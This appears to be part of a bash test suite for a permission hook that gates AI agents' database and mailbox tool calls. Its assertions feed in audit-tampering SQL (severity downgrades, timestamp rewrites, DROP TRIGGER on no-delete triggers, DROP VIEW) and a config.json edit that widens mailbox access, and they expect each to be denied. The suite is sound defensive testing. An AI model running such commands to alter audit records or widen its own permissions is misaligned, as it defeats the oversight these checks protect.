t_assert "R5a: severity downgrade by UPDATE → deny" "deny" "$(_gp cso "turso db shell company-x \"UPDATE security_audit_log SET severity='low' WHERE id=150\"")"
t_assert "R5a: status UPDATE whose WHERE names severity → allow (WHERE is not a write)" "allow" \
  "$(_gp cso "turso db shell company-x \"UPDATE security_audit_log SET status='resolved' WHERE severity='high' AND id=150\"")"
t_assert "R5a: created_at rewrite → deny" "deny" \
  "$(_gp cso "turso db shell company-x \"UPDATE security_audit_log SET status='resolved', created_at='2026-01-01' WHERE id=150\"")"
t_assert "R5a: decisions rationale rewrite → deny" "deny" "$(_gp cso "turso db shell company-x \"UPDATE decisions SET rationale='x' WHERE id=5\"")"
t_assert "R5a: documented approval UPDATE (approved_by IS NULL guard) → allow" "allow" \
  "$(_gp cos "turso db shell company-x \"UPDATE decisions SET status='approved', approved_by='ceo', approved_at=CURRENT_TIMESTAMP WHERE id=5 AND approved_by IS NULL\"")"
t_assert "R5a: approval UPDATE without the guard → deny" "deny" \
  "$(_gp cos "turso db shell company-x \"UPDATE decisions SET status='approved', approved_by='ceo', approved_at=CURRENT_TIMESTAMP WHERE id=5\"")"
t_assert "R5a: typed created_at on INSERT → deny" "deny" \
  "$(_gp cso "turso db shell company-x \"INSERT INTO security_audit_log (auditor,finding,severity,created_at) VALUES ('cso','x','high','2026-07-01')\"")"
t_assert "R5a: INSERT OR REPLACE into decisions → deny" "deny" "$(_gp cso "turso db shell company-x \"INSERT OR REPLACE INTO decisions (id,title) VALUES (5,'x')\"")"
t_assert "R5a: DROP TRIGGER → deny" "deny" "$(_gp cso 'turso db shell company-x "DROP TRIGGER decisions_no_delete"')"
# H18 / BUG-090: the adopter's acceptance case, plus DROP VIEW (any role) on
# both DB CLIs. The rule lives in the per-statement SQL gate and
# sql_deny_patterns only — NOT the universal full-command deny_patterns, which
# would deny every commit message / PR title that mentions it (CEO call).
t_assert "H18: DROP TRIGGER security_audit_log_no_delete → deny" "deny" \
  "$(_gp cso 'turso db shell company-x "DROP TRIGGER IF EXISTS security_audit_log_no_delete"')"
t_assert "H18: DROP VIEW decisions_current → deny" "deny" "$(_gp cos 'turso db shell company-x "DROP VIEW decisions_current"')"
t_assert "H18: DROP TEMP VIEW → deny" "deny" "$(_gp cos 'turso db shell company-x "DROP TEMP VIEW x"')"
t_assert "H18: DROP VIEW via sqlite3 → deny" "deny" "$(_gp cso 'sqlite3 /tmp/x.db "DROP VIEW IF EXISTS security_audit_log_current"')"
t_assert "H18: a commit message mentioning DROP VIEW → allow (not a DB command)" "allow" \
  "$(_gp cso "git commit -q -m 'docs: why DROP VIEW is denied'")"
t_assert "H18: prose 'drop view' inside an INSERT literal → allow" "allow" \
  "$(_gp cso "turso db shell company-x \"INSERT INTO audit_events (target_table,target_id,event_type,reason,author,authority_ref) VALUES ('decisions',5,'note','checked that no one can DROP VIEW here','cso',300)\"")"
t_assert "R5a: UPDATE audit_events → deny" "deny" "$(_gp cso "turso db shell company-x \"UPDATE audit_events SET reason='x' WHERE id=1\"")"
t_assert "R5a: INSERT audit_events → allow" "allow" \
  "$(_gp cso "turso db shell company-x \"INSERT INTO audit_events (target_table,target_id,event_type,reason,author,authority_ref) VALUES ('security_audit_log',150,'note','context','cso',300)\"")"
t_assert "R5a: prose mentioning DELETE FROM in a non-DB command → allow" "allow" "$(_gp cso 'git status && echo "DELETE FROM decisions mention"')"
rm -rf "$_SQ_DIR"
rm -f "$_GP_CFG"

# ─────────────────────────────────────────────
# Track 2g — per-agent shared-mailbox gate (decisions#301 K2)
# ─────────────────────────────────────────────
suite "Track 2g: shared-mailbox gate for m365-mail (decisions#301 K2)"

_T2G_DIR="$(mktemp -d)"
# $1 = main_thread mode ("" = key absent) → writes the fixture config, prints its path
_t2g_cfg() {
  local f="$_T2G_DIR/cfg-${1:-default}.json"
  jq -n --arg mode "$1" '{
    db: { provider: "turso", url: "libsql://test.fake" },
    shared_mailboxes: ({
      by_agent: {
        cfo: [ { upn: "finance@example.test", scope: "read" } ],
        clo: [ { upn: "legal@example.test",   scope: "read" } ],
        cmo: [ { upn: "social@example.test",  scope: "read" } ],
        cco: [],
        cro: [ { upn: "research@example.test", scope: "readwrite" } ]
      } } + (if $mode == "" then {} else { main_thread: $mode } end))
  }' > "$f"
  echo "$f"
}
_T2G_CFG_DEFAULT=$(_t2g_cfg "")
_T2G_CFG_A=$(_t2g_cfg "ceo_present_read")
_T2G_CFG_C=$(_t2g_cfg "deny")
_T2G_CFG_COS="$_T2G_DIR/cfg-cos.json"
jq '.shared_mailboxes.by_agent.cos = [ { upn: "finance@example.test", scope: "read" } ]' "$_T2G_CFG_DEFAULT" > "$_T2G_CFG_COS"
_T2G_CFG_NOKEY="$_T2G_DIR/cfg-nokey.json"
echo '{"db":{"provider":"turso","url":"libsql://test.fake"}}' > "$_T2G_CFG_NOKEY"

# _t2g <cfg> <agent_type|""> <tool> <shared_user|""> → "allow" / "deny:k2" / "deny:other"
_t2g() {
  local ev out dec rsn
  ev=$(jq -cn --arg a "$2" --arg t "mcp__m365-mail__m365-mail_$3" --arg u "$4" '
    {tool_name:$t, session_id:"s-k2", tool_input:(if $u == "" then {query:"x"} else {query:"x", shared_user:$u} end)}
    + (if $a == "" then {} else {agent_type:$a} end)')
  # The rules live in security/policy.json (BUG-083): test mode stands in for
  # origin/main, with the fixture's shared_mailboxes block as the policy.
  jq '{version: 1} + (if has("shared_mailboxes") then {shared_mailboxes} else {} end)' "$1" > "$_T2G_DIR/policy-from-cfg.json"
  out=$(echo "$ev" | JUVANT_POLICY_TEST=1 JUVANT_POLICY_FILE="$_T2G_DIR/policy-from-cfg.json" JUVANT_CONFIG="$1" AGENT_ROLE="" \
          bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null || true)
  dec=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision' 2>/dev/null)
  rsn=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null)
  if [[ "$dec" == "allow" ]]; then echo allow
  elif [[ "$rsn" == *"MAILBOX-ACCESS POLICY"* ]]; then echo "deny:k2"
  else echo "deny:other"; fi
}
_t2g_audit_reset() { t_purge security_audit_log; rm -f "$JUVANT_SPOOL"; }
_t2g_audit() { bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1 || true; t_db "$1"; }

C="$_T2G_CFG_DEFAULT"
# Allowlist by agent.
_t2g_audit_reset
t_assert "cfo search_messages finance@ → allow" "allow" "$(_t2g "$C" cfo search_messages finance@example.test)"
t_assert "  …allow writes an info access-event audit row" "1" \
  "$(_t2g_audit "SELECT count(*) FROM security_audit_log WHERE severity='info' AND category='access-event' AND finding LIKE '%finance@example.test%cfo%decision=allow%';")"
_t2g_audit_reset
t_assert "cfo search_messages legal@ → deny" "deny:k2" "$(_t2g "$C" cfo search_messages legal@example.test)"
t_assert "  …deny writes a high unauthorized-read audit row" "1" \
  "$(_t2g_audit "SELECT count(*) FROM security_audit_log WHERE severity='high' AND category='unauthorized-read' AND finding LIKE '%legal@example.test%cfo%decision=deny%';")"
t_assert "clo get_message legal@ → allow" "allow" "$(_t2g "$C" clo get_message legal@example.test)"
t_assert "cmo list_messages legal@ → deny" "deny:k2" "$(_t2g "$C" cmo list_messages legal@example.test)"
t_assert "cco (empty list) list_messages finance@ → deny" "deny:k2" "$(_t2g "$C" cco list_messages finance@example.test)"
t_assert "agent with no by_agent key (cso) → deny" "deny:k2" "$(_t2g "$C" cso search_messages finance@example.test)"
t_assert "upn match is case-insensitive (Finance@EXAMPLE.test)" "allow" "$(_t2g "$C" cfo search_messages Finance@EXAMPLE.test)"
t_assert "cfo download_attachment / list_attachments / list_mail_folders finance@ → allow" "allow allow allow" \
  "$(_t2g "$C" cfo download_attachment finance@example.test) $(_t2g "$C" cfo list_attachments finance@example.test) $(_t2g "$C" cfo list_mail_folders finance@example.test)"

# Scope: read allows class A only.
for _op in move_message delete_message create_draft create_reply_draft create_forward_draft update_draft mark_read; do
  t_assert "cfo $_op finance@ (scope=read) → deny" "deny:k2" "$(_t2g "$C" cfo "$_op" finance@example.test)"
done
_t2g_audit_reset
_t2g "$C" cfo delete_message finance@example.test >/dev/null
t_assert "  …write deny is audited as unauthorized-write (high)" "1" \
  "$(_t2g_audit "SELECT count(*) FROM security_audit_log WHERE severity='high' AND category='unauthorized-write';")"
t_assert "readwrite scope (cro research@) create_draft → allow" "allow" "$(_t2g "$C" cro create_draft research@example.test)"
t_assert "readwrite scope (cro research@) search → allow" "allow" "$(_t2g "$C" cro search_messages research@example.test)"
t_assert "unclassified tool verb on a shared mailbox → deny (deny-by-default)" "deny:k2" \
  "$(_t2g "$C" cro frobnicate_mailbox research@example.test)"

# Own delegated mailbox (no shared_user) → own_mailbox rules (more below);
# other MCP servers are out of scope.
_t2g_audit_reset
t_assert "cfo search_messages, NO shared_user → own-mailbox read (allow)" "allow" "$(_t2g "$C" cfo search_messages "")"
t_assert "  …allowed own-mailbox read → no Track 2g audit row" "0" \
  "$(_t2g_audit "SELECT count(*) FROM security_audit_log WHERE finding LIKE 'shared-mailbox%';")"
t_assert "non-m365-mail tool carrying shared_user → untouched" "allow" "$(
  jq -cn '{tool_name:"mcp__other__search", session_id:"s-k2", agent_type:"cmo", tool_input:{shared_user:"legal@example.test"}}' \
    | JUVANT_CONFIG="$C" bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision')"

# by_agent absent → no-op.
t_assert "by_agent key absent → cmo legal@ allowed (no-op)" "allow" "$(_t2g "$_T2G_CFG_NOKEY" cmo search_messages legal@example.test)"
t_assert "by_agent key absent → cfo delete_message finance@ allowed (no-op)" "allow" "$(_t2g "$_T2G_CFG_NOKEY" cfo delete_message finance@example.test)"

# Main thread (no agent_type).
t_assert "main thread, default (explicit), no cos entry → deny" "deny:k2" "$(_t2g "$C" "" search_messages finance@example.test)"
t_assert "main thread, explicit + by_agent.cos finance@ → allow" "allow" "$(_t2g "$_T2G_CFG_COS" "" search_messages finance@example.test)"
t_assert "main thread, explicit + cos entry, other mailbox → deny" "deny:k2" "$(_t2g "$_T2G_CFG_COS" "" search_messages legal@example.test)"
_t2g_audit_reset
t_assert "main thread, ceo_present_read, search finance@ → allow" "allow" "$(_t2g "$_T2G_CFG_A" "" search_messages finance@example.test)"
t_assert "  …audited with basis main_thread=ceo_present_read" "1" \
  "$(_t2g_audit "SELECT count(*) FROM security_audit_log WHERE finding LIKE '%main_thread=true, basis=main_thread=ceo_present_read%decision=allow%';")"
t_assert "main thread, ceo_present_read, delete_message finance@ → deny (read only)" "deny:k2" \
  "$(_t2g "$_T2G_CFG_A" "" delete_message finance@example.test)"
t_assert "main thread, ceo_present_read, mailbox no agent is allowed → deny" "deny:k2" \
  "$(_t2g "$_T2G_CFG_A" "" search_messages ceo-private@example.test)"
t_assert "main thread, deny mode → deny" "deny:k2" "$(_t2g "$_T2G_CFG_C" "" search_messages finance@example.test)"
t_assert "subagent typed cos is NOT the main thread (ceo_present_read doesn't apply)" "deny:k2" \
  "$(_t2g "$_T2G_CFG_A" cos search_messages finance@example.test)"

# BUG-083: rules from security/policy.json (test mode stands in for origin/main).
# _t2gp <policy-file> <cfg> <agent_type|""> <tool> <shared_user|""> → as _t2g
_t2gp() {
  local ev out dec rsn
  ev=$(jq -cn --arg a "$3" --arg t "mcp__m365-mail__m365-mail_$4" --arg u "$5" '
    {tool_name:$t, session_id:"s-k2p", tool_input:(if $u == "" then {query:"x"} else {query:"x", shared_user:$u} end)}
    + (if $a == "" then {} else {agent_type:$a} end)')
  out=$(echo "$ev" | JUVANT_POLICY_TEST=1 JUVANT_POLICY_FILE="$1" JUVANT_CONFIG="$2" AGENT_ROLE="" \
          bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null || true)
  dec=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision' 2>/dev/null)
  rsn=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null)
  if [[ "$dec" == "allow" ]]; then echo allow
  elif [[ "$rsn" == *"MAILBOX-ACCESS POLICY"* ]]; then echo "deny:k2"
  else echo "deny:other"; fi
}
_T2G_POL="$_T2G_DIR/policy.json"
jq '{version: 1, shared_mailboxes: .shared_mailboxes}' "$_T2G_CFG_DEFAULT" > "$_T2G_POL"
_T2G_POL_OWNRW="$_T2G_DIR/policy-own-rw.json"
jq '.shared_mailboxes.own_mailbox = {main_thread: "deny", agents: "readwrite"}' "$_T2G_POL" > "$_T2G_POL_OWNRW"
_T2G_POL_NOKEY="$_T2G_DIR/policy-nokey.json"; echo '{"version":1}' > "$_T2G_POL_NOKEY"
_T2G_POL_BAD="$_T2G_DIR/policy-bad.json"
echo '{"version":1,"shared_mailboxes":{"by_agent":{"cfo":[{"upn":"finance@example.test","scope":"admin"}]}}}' > "$_T2G_POL_BAD"
# An agent that emptied / rewrote config.json can't widen the policy-file rules.
_T2G_CFG_OPEN="$_T2G_DIR/cfg-open.json"
jq '.shared_mailboxes.by_agent.cmo = [ { upn: "legal@example.test", scope: "readwrite" } ]' "$_T2G_CFG_DEFAULT" > "$_T2G_CFG_OPEN"
t_assert "policy rules: cfo search finance@ → allow" "allow" "$(_t2gp "$_T2G_POL" "$_T2G_CFG_NOKEY" cfo search_messages finance@example.test)"
t_assert "policy rules + config.json emptied → cmo legal@ still denied (no tamper switch-off)" "deny:k2" \
  "$(_t2gp "$_T2G_POL" "$_T2G_CFG_NOKEY" cmo search_messages legal@example.test)"
t_assert "policy rules win over a widened config.json (cmo legal@ readwrite there)" "deny:k2" \
  "$(_t2gp "$_T2G_POL" "$_T2G_CFG_OPEN" cmo delete_message legal@example.test)"
# v1.16.0: a config.json block is never read — left unmigrated, it fails closed.
t_assert "policy without shared_mailboxes + config.json block → even an allowlisted read denied" "deny:k2" \
  "$(_t2gp "$_T2G_POL_NOKEY" "$_T2G_CFG_DEFAULT" cfo search_messages finance@example.test)"
t_assert "  …own mailbox too (main-thread send denied)" "deny:k2" \
  "$(_t2gp "$_T2G_POL_NOKEY" "$_T2G_CFG_DEFAULT" "" send_mail "")"
_T2G_RSN=$(jq -cn '{tool_name:"mcp__m365-mail__m365-mail_search_messages", session_id:"s-k2", agent_type:"cfo", tool_input:{shared_user:"finance@example.test"}}' \
    | JUVANT_POLICY_TEST=1 JUVANT_POLICY_FILE="$_T2G_POL_NOKEY" JUVANT_CONFIG="$_T2G_CFG_DEFAULT" bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null \
    | jq -r '.hookSpecificOutput.permissionDecisionReason')
t_assert "  …reason says config.json is no longer read and names the fix" "yes" \
  "$([[ "$_T2G_RSN" == *"no longer read"*"moved into security/policy.json"* ]] && echo yes || echo no)"
_t2g_audit_reset
_t2gp "$_T2G_POL_NOKEY" "$_T2G_CFG_DEFAULT" cfo search_messages finance@example.test >/dev/null
t_assert "  …audited high with basis config.json (not read)" "1" \
  "$(_t2g_audit "SELECT count(*) FROM security_audit_log WHERE severity='high' AND finding LIKE '%basis=config.json (not read)%decision=deny%';")"
t_assert "  …calls outside the tool_prefix are untouched" "allow" "$(
  jq -cn '{tool_name:"mcp__other__search", session_id:"s-k2", agent_type:"cfo", tool_input:{shared_user:"finance@example.test"}}' \
    | JUVANT_POLICY_TEST=1 JUVANT_POLICY_FILE="$_T2G_POL_NOKEY" JUVANT_CONFIG="$_T2G_CFG_DEFAULT" bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null \
    | jq -r '.hookSpecificOutput.permissionDecision')"
t_assert "invalid shared_mailboxes in the policy → fail closed on mcp__ (not a K2 allow)" "deny:other" \
  "$(_t2gp "$_T2G_POL_BAD" "$_T2G_CFG_NOKEY" cfo search_messages finance@example.test)"
t_assert "no policy file at all + config.json block → denied, no DEPRECATED fallback" "deny:k2 no" "$(
  _ev=$(jq -cn '{tool_name:"mcp__m365-mail__m365-mail_search_messages", session_id:"s-k2", agent_type:"cfo", tool_input:{shared_user:"finance@example.test"}}')
  _out=$(echo "$_ev" | JUVANT_CONFIG="$_T2G_CFG_DEFAULT" bash "$HOOKS_DIR/pre-tool-use.sh" 2>"$_T2G_DIR/err")
  [[ "$(echo "$_out" | jq -r '.hookSpecificOutput.permissionDecisionReason')" == *"MAILBOX-ACCESS POLICY (BUG-083)"* ]] && printf 'deny:k2' || printf 'other'
  grep -q 'DEPRECATED: shared-mailbox' "$_T2G_DIR/err" && echo ' yes' || echo ' no')"
# Own mailbox (no shared_user) — gated only from the policy file (BUG-083 T2).
_t2g_audit_reset
t_assert "own mailbox, subagent read (default agents=read) → allow" "allow" "$(_t2gp "$_T2G_POL" "$_T2G_CFG_NOKEY" cfo search_messages "")"
t_assert "  …allowed own-mailbox read writes no audit row" "0" \
  "$(_t2g_audit "SELECT count(*) FROM security_audit_log WHERE finding LIKE 'shared-mailbox%own mailbox%';")"
_t2g_audit_reset
for _op in send_mail create_draft delete_message move_message reply_message; do
  t_assert "own mailbox, subagent $_op (agents=read) → deny" "deny:k2" "$(_t2gp "$_T2G_POL" "$_T2G_CFG_NOKEY" cfo "$_op" "")"
done
t_assert "  …own-mailbox write deny is audited (high, unauthorized-write)" "5" \
  "$(_t2g_audit "SELECT count(*) FROM security_audit_log WHERE severity='high' AND category='unauthorized-write' AND finding LIKE '%own mailbox%';")"
t_assert "own mailbox, subagent unclassified tool (agents=read) → deny" "deny:k2" "$(_t2gp "$_T2G_POL" "$_T2G_CFG_NOKEY" cfo frobnicate "")"
t_assert "own mailbox, main thread send (default main_thread=readwrite) → allow" "allow" "$(_t2gp "$_T2G_POL" "$_T2G_CFG_NOKEY" "" send_mail "")"
t_assert "own mailbox, agents=readwrite → subagent send allowed" "allow" "$(_t2gp "$_T2G_POL_OWNRW" "$_T2G_CFG_NOKEY" cfo send_mail "")"
t_assert "own mailbox, main_thread=deny → main-thread read denied" "deny:k2" "$(_t2gp "$_T2G_POL_OWNRW" "$_T2G_CFG_NOKEY" "" search_messages "")"
rm -rf "$_T2G_DIR"

# ─────────────────────────────────────────────
# config-change.sh — ConfigChange forensic logging (FEAT-062)
# ─────────────────────────────────────────────
suite "config-change.sh (FEAT-062)"

t_purge agent_actions_log "tool_name='ConfigChange'"
cc_event=$(jq -n '{session_id:"sess-cc-1", hook_event_name:"ConfigChange", source:"project_settings", file_path:"/repo/.claude/settings.json"}')
echo "$cc_event" | bash "$HOOKS_DIR/config-change.sh" 2>/dev/null
t_assert "ConfigChange hook exits 0 (non-blocking)" "0" "$?"
t_assert "logs a ConfigChange row to agent_actions_log" "1" \
  "$(t_db "SELECT count(*) FROM agent_actions_log WHERE tool_name='ConfigChange' AND status='success';")"
t_assert "row carries source + file in input_summary" "config change: project_settings (settings.json)" \
  "$(t_db "SELECT input_summary FROM agent_actions_log WHERE tool_name='ConfigChange' LIMIT 1;")"
t_assert "row agent='system' + session captured" "system|sess-cc-1" \
  "$(t_db "SELECT agent||'|'||session_id FROM agent_actions_log WHERE tool_name='ConfigChange' LIMIT 1;")"
# Resilience: an empty/garbled event must still exit 0 and never break the session.
printf '' | bash "$HOOKS_DIR/config-change.sh" 2>/dev/null
t_assert "empty event still exits 0 (observational, never blocks)" "0" "$?"

# ─────────────────────────────────────────────
# Multi-byte Edit summary (found 2026-10-29): `head -c 80` cut a multi-byte
# character in half and the SQL escape then aborted the hook ("illegal byte
# sequence") — under onFailure:block that BLOCKED the Edit itself.
# ─────────────────────────────────────────────
suite "Edit with a multi-byte character at the 80-byte summary boundary"
_mb_old=$(printf '    fi\n  fi\nfi\n\n# ')$(printf '\xe2\x94\x80%.0s' $(seq 1 40))
_mb_ev=$(jq -cn --arg o "$_mb_old" '{tool_name:"Edit",session_id:"s-mb",tool_input:{file_path:"docs/x.md",old_string:$o,new_string:"y"}}')
_mb_out=$(echo "$_mb_ev" | bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null); _mb_rc=$?
t_assert "hook exits 0 (does not abort)" "0" "$_mb_rc"
t_assert "decision is allow" "allow" "$(echo "$_mb_out" | jq -r '.hookSpecificOutput.permissionDecision' 2>/dev/null)"

# ─────────────────────────────────────────────
# G6 (decisions#303): with BOTH transports faked, a full drain must leave the
# spool empty. Anything left means some write took a path the fakes don't
# cover (e.g. a new curl endpoint, or a turso-only fake) and the suite passed
# for the wrong reason.
# ─────────────────────────────────────────────
suite "G6: spool empty after a full drain"
bash "$ROOT_DIR/helpers/drain-audit-spool.sh" >/dev/null 2>&1 || true
t_assert "spool has no pending statements after the final drain" "0" \
  "$( { [[ -f "$JUVANT_SPOOL" ]] && grep -c . "$JUVANT_SPOOL"; } 2>/dev/null || echo 0)"

echo
echo "==================================================="
TOTAL=$((PASS+FAIL))
echo "Total: $TOTAL · Passed: $PASS · Failed: $FAIL"
if [[ $FAIL -gt 0 ]]; then
  exit 1
fi
exit 0
